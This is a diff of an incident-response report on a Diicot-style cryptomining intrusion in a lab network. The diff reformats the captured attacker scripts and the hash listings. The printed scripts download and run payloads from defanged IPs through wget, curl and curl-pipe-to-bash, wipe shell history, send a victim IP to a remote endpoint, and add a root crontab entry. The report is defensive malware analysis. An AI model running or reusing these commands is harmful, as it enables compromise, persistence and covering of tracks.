@@ -55,7 +55,37 @@ Network traffic consistent with an SSH brute-force attack was observed. The susp
 <u>Script</u>:
 
 ```powershell
-./network "rm -rf /var/tmp/Documents ; mkdir /var/tmp/Documents 2>&1 ; crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr -iae /var/tmp Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ; pkill xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/; mv /var/tmp/diicot /var/tmp Documents/.diicot ; mv /var/tmp/kuak /var/tmp/Documents/kuak ; cd /var/tmp/Documents ; chmod +x .* ; /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history ; rm -rf /tmp/cache ; cd /tmp/ ; wget -q 85[.]31[.]47[.]99/.NzJjOTYwxx5/.balu || curl -O -s -L 85[.]31[.]47[.]99/.NzJjOTYwxx5/.balu ; mv .balu cache ; chmod +x cache ; ./cache >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history"
+./network "
+    rm -rf /var/tmp/Documents
+    mkdir /var/tmp/Documents 2>&1
+    crontab -r
+    chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1
+    cd /var/tmp
+    chattr -iae /var/tmp/Documents/.diicot
+    pkill Opera
+    pkill cnrig
+    pkill java
+    killall java
+    pkill xmrig
+    killall cnrig
+    killall xmrig
+    cd /var/tmp/
+    mv /var/tmp/diicot /var/tmp/Documents/.diicot
+    mv /var/tmp/kuak /var/tmp/Documents/kuak
+    cd /var/tmp/Documents
+    chmod +x .*
+    /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown
+    history -c
+    rm -rf .bash_history ~/.bash_history
+    rm -rf /tmp/cache
+    cd /tmp/
+    wget -q 85[.]31[.]47[.]99/.NzJjOTYwxx5/.balu || curl -O -s -L 85[.]31[.]47[.]99/.NzJjOTYwxx5/.balu
+    mv .balu cache
+    chmod +x cache
+    ./cache >/dev/null 2>&1 & disown
+    history -c
+    rm -rf .bash_history ~/.bash_history
+"
 ```
 
 <u>Script Actions</u>
@@ -100,7 +130,13 @@ Revisiting the script used in the SSH brute force attack, the script executed bo
 The `DeviceNetworkEvents` table was queried to determine whether the compromised system had successfully connected to the specified IP address. A thorough inspection of the network logs revealed that no successful connection had occurred. Concluding that no successful connection had occurred, the domain associated with the IP address was used in several queries to search across multiple log tables. Another script was found in the `DeviceEvents` table that explicitly referenced the domain name in the code. The script discovered:
 
 ```powershell
-#!/bin/bash\nif curl -s --connect-timeout 15 196[.]251[.]114[.]67/.x/black3; then\n curl -s 196[.]251[.]114[.]67/.x/black3 | bash >/dev/null 2>&1\nelse\n curl -s --connect-timeout 15 digital[.]digitaldatainsights[.]org/.x/black3 | bash >/dev/null 2>&1\nfi\n
+#!/bin/bash
+
+if curl -s --connect-timeout 15 196[.]251[.]114[.]67/.x/black3; then
+    curl -s 196[.]251[.]114[.]67/.x/black3 | bash >/dev/null 2>&1
+else
+    curl -s --connect-timeout 15 digital[.]digitaldatainsights[.]org/.x/black3 | bash >/dev/null 2>&1
+fi
 ```
 
 <u>Script Actions</u>
@@ -250,11 +286,11 @@ Devices:
 
 Had the malicious cache file with a SHA256 hash of,
 
-SHA256: `0e13e9e4443102bf5b26396b5319f528642b4f0477feb9c7f536fab379b73074`
+* SHA256: `0e13e9e4443102bf5b26396b5319f528642b4f0477feb9c7f536fab379b73074`
 
 However the latest cache file created on device, `sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net` had a distinct SHA256 hash from the previous iterations, suggesting that the threat actor was employing defense evasion techniques to remain undetected in the network. The SHA256 hash being discussed has a value of,
 
-SHA256: `8c2a00409bad8033fec13fc6ffe4aa4732d80400072043b71ceb57db37244129`
+* SHA256: `8c2a00409bad8033fec13fc6ffe4aa4732d80400072043b71ceb57db37244129`
 
 Using VirusTotal again to confirm if the suspected file was malicious or not, resulted in another positive result. Another note to add for the first three created cache files, all three were created with an initiating process command line of,
 
@@ -331,7 +367,37 @@ Within the device `sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp
 Script
 
 ```bash
-./network "rm -rf /var/tmp/Documents ; mkdir /var/tmp/Documents 2>&1 ; crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr -iae /var/tmp/Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ; pkill xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/; mv /var/tmp/diicot /var/tmp/Documents/.diicot ; mv /var/tmp/kuak /var/tmp/Documents/kuak ; cd /var/tmp/Documents ; chmod +x .* ; /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history ; rm -rf /tmp/cache ; cd /tmp/ ; wget -q 85[.]31[.]47[.]99/.NzJjOTYwxx5/.balu || curl -O -s -L 85[.]31[.]47[.]99/.NzJjOTYwxx5/.balu ; mv .balu cache ; chmod +x cache ; ./cache >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history ~/.bash_history"
+./network "
+    rm -rf /var/tmp/Documents
+    mkdir /var/tmp/Documents 2>&1
+    crontab -r
+    chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1
+    cd /var/tmp
+    chattr -iae /var/tmp/Documents/.diicot
+    pkill Opera
+    pkill cnrig
+    pkill java
+    killall java
+    pkill xmrig
+    killall cnrig
+    killall xmrig
+    cd /var/tmp/
+    mv /var/tmp/diicot /var/tmp/Documents/.diicot
+    mv /var/tmp/kuak /var/tmp/Documents/kuak
+    cd /var/tmp/Documents
+    chmod +x .*
+    /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown
+    history -c
+    rm -rf .bash_history ~/.bash_history
+    rm -rf /tmp/cache
+    cd /tmp/
+    wget -q 85[.]31[.]47[.]99/.NzJjOTYwxx5/.balu || curl -O -s -L 85[.]31[.]47[.]99/.NzJjOTYwxx5/.balu
+    mv .balu cache
+    chmod +x cache
+    ./cache >/dev/null 2>&1 & disown
+    history -c
+    rm -rf .bash_history ~/.bash_history
+"
 ```
 
 The script performs multiple malicious actions that include the following activity:
@@ -352,7 +418,7 @@ The `network` file’s observed activity also appears to mimic documented behavi
 
 The file location of the network file is `/dev/shm/.x/network` and with the payload being initiated by the `root` user in the `sakel-lunix-2` domain. The discovered `network` payload has a SHA256 hash value of,
 
-SHA256: `cbd686aa89749264552a9c11c3cf6a091991a123359ef2e5cafff3a0b05ef255`
+* SHA256: `cbd686aa89749264552a9c11c3cf6a091991a123359ef2e5cafff3a0b05ef255`
 
 This file has not yet been flagged as malicious by public online services, such as VirusTotal, at the time of this report. Expanding my search within the CyberRange network for the script, uncovered other systems containing it
 
@@ -377,7 +443,13 @@ The query revealed that the script was also present in three other systems, the 
 Other suspicious activity also occurs at `2025-03-14T17:52:01.898895Z` when the threat actor executes the cache file initiating a connection request to a known Diicot C2 server. And another instance of suspicious behavior occurs at `2025-03-14T18:23:35.941725Z` when the threat actor executes the command,
 
 ```bash
-curl --silent http://196[.]251[.]73[.]38:47/save-data?IP=45[.]64[.]186[.]20 -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" -H "Accept-Language: en-US,en;q=0.9" -H "Cache-Control: max-age=0" -H "Connection: keep-alive" -H "Upgrade-Insecure-Requests: 1" --insecure
+curl --silent "http://196[.]251[.]73[.]38:47/save-data?IP=45[.]64[.]186[.]20" \
+     -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
+     -H "Accept-Language: en-US,en;q=0.9" \
+     -H "Cache-Control: max-age=0" \
+     -H "Connection: keep-alive" \
+     -H "Upgrade-Insecure-Requests: 1" \
+     --insecure
 ```
 
 The command sends the IP address `45[.]64[.]186[.]20` to the remote IP address of `196[.]251[.]73[.]38` on port 47. Suggesting that there is possible data exfiltration, tracking, or botnet communication occurring. Referencing the remote IP address to VirusTotal returned a positive malicious affiliated IP address.
@@ -509,8 +581,10 @@ DeviceProcessEvents
 Several commands were returned that indicated both highly suspicious activity and scripts being conducted on numerous systems.An example of commands executing cron jobs for persistence is:
 
 ```bash
-sh -c "sed -i '/\/etc\/cron.hourly\/gcc.sh/d' /etc/crontab && echo '*/3 * * * * root /etc/cron.hourly/gcc.sh' >> /etc/crontab"
+sh -c "sed -i '/\/etc\/cron.hourly\/gcc.sh/d' /etc/crontab && \
+echo '*/3 * * * * root /etc/cron.hourly/gcc.sh' >> /etc/crontab"
 ```
+
 Script Actions:
 
 * `/\/etc\/cron.hourly\/gcc.sh/d` - tells `sed` to delete any line that contains `/etc/cron.hourly/gcc.sh` in it
@@ -629,7 +703,7 @@ DeviceFileEvents
 
 The query yielded several notable logs. To confirm whether the queried file was malicious or associated with Diicot’s `Update` file, its SHA256 hash was referenced in a VirusTotal query. VirusTotal associated the discovered `.b` task as one of the embedded files found in the main malicious payload Update. The SHA256 hash of the `.b` file is,
 
-SHA256: `a9a4f021f91d1f35888c4e2fe7d2af2d458de8c8aba4f5815f1ed3125650c28f`
+* SHA256: `a9a4f021f91d1f35888c4e2fe7d2af2d458de8c8aba4f5815f1ed3125650c28f`
 
 Using the following query, the next step was to identify which devices contained the crontab.
 
@@ -665,13 +739,19 @@ The next bash script embedded in the Update payload is the `.c` file. Unlike the
 Script:
 
 ```bash
-#!/bin/bash\nif curl -s --connect-timeout 15 196[.]251[.]114[.]67/.x/black3; then\n curl -s 196[.]251[.]114[.]67/.x/black3 | bash >/dev/null 2>&1\nelse\n curl -s --connect-timeout 15 digital[.]digitaldatainsights[.]org/.x/black3 | bash >/dev/null 2>&1\nfi\n
+#!/bin/bash
+
+if curl -s --connect-timeout 15 196[.]251[.]114[.]67/.x/black3; then
+    curl -s 196[.]251[.]114[.]67/.x/black3 | bash >/dev/null 2>&1
+else
+    curl -s --connect-timeout 15 digital[.]digitaldatainsights[.]org/.x/black3 | bash >/dev/null 2>&1
+fi
 ```
 
 The script silently fetches from the two URLs, `196[.]251[.]114[.]67/.x/black3` and `digital[.]digitaldatainsights[.]org/.x/black3` attempting to fetch another possible script called `black3`. Having previously read the Wiz’s report on Diicot’s malware campaigns, the domain is associated with the Bash script used in the `.c` cron job. The URL `digital[.]digitaldatainsights[.]org/.x/black3` is explicitly referenced as the domain from which the malicious script initiates a download. Analyzing the IP address
 `196[.]251[.]114[.]67` from the script using VirusTotal revealed that it has also been flagged for malicious activity. Once the script was identified as being malicious in nature, the associated SHA256 hash value was extracted for additional analysis.
 
-SHA256: `1b1746b42c4ba33f653fe0822f12e3da51767c03347b1f2477e07a91b735b093`
+* SHA256: `1b1746b42c4ba33f653fe0822f12e3da51767c03347b1f2477e07a91b735b093`
 
 The SHA256 hash is not classified as malicious by VirusTotal at the moment. Using the script’s SHA256 hash value, another query was constructed to search for the presence of similar scripts in other systems within the CyberRange network.
 
@@ -685,7 +765,7 @@ DeviceFileEvents
 
 The returned logs identified the file name as 'ssshd' and indicated its presence on the following devices,
 
-1. linux-program-fix.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
+1. `linux-program-fix.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
 
 2. `28514056957f4ceedbafaeb39f57f1bdca663cf5`
 
